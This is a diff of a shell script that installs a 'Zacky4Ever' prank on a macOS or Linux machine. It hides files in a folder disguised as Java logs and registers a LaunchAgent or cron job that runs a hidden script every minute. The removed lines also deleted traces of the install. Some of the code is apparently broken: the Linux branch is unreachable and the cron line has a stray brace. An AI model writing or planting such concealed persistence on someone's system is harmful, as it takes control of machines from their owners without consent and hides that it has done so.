@@ -1,20 +1,46 @@
+#!/bin/sh
+# Install the Zacky4Ever prank.
 
-# IMPORTANT: this file should be executed
-# without cloning the repo
-# it will setup the hole prank
-# and then will remove all obvious trace ;)
+# check os
+if [[ "$OSTYPE" == "darwin"* ]]; then
+    OS="MAC"
+fi
 
+if [ "${OS+set}" != set ]; then
+  echo "INVALID OS"
+  exit 1
+fi
 
-# INSTALL
+# setup root folder
+# remove jic
+ROOT_FOLDER=$HOME/.JAVA_LOGS_1805
+rm -rf $ROOT_FOLDER
 
-git clone https://github.com/rusito-23/Zacky4Ever.git $HOME/Zacky4Ever
-cd $HOME/Zacky4Ever
-sh zac-efron.sh
+# copy content into root folder
+cp -r pictures $ROOT_FOLDER
+cp randomizer.sh $ROOT_FOLDER/.randomizer.sh
+cp jobs/$OS.sh $ROOT_FOLDER/.job.sh
 
-# REMOVE ALL TRACES
-cd $HOME
-rm -rf $HOME/Zacky4Ever
+# give perms to job and randomizer
+chmod +x $ROOT_FOLDER/.randomizer.sh
+chmod +x $ROOT_FOLDER/.job.sh
 
-SB_GREEN="\033[0;32m"
-SB_NOCOLOR="\033[0m"
-echo "${SB_GREEN}READY BITCH${SB_NOCOLOR}"
+# setup cronjob
+if [[ "$OS" == "MAC" ]]; then # running macOS
+
+    # create plist
+    PLIST_NAME=com.zac.efron.plist
+    touch $HOME/Library/LaunchAgents/$PLIST_NAME
+    echo $(sh $HOME/Zacky4Ever/plist.sh $ROOT_FOLDER) > $HOME/Library/LaunchAgents/$PLIST_NAME
+
+    # launch plist
+    launchctl unload $HOME/Library/LaunchAgents/$PLIST_NAME
+    launchctl load $HOME/Library/LaunchAgents/$PLIST_NAME
+
+else # running Linux
+
+    (crontab -l -u $USER 2>/dev/null; \
+    echo "* * * * * $ROOT_FOLDER/.job.sh $ROOT_FOLDER > $ROOT_FOLDER}.logs 2>&1") \
+    | crontab -
+
+fi
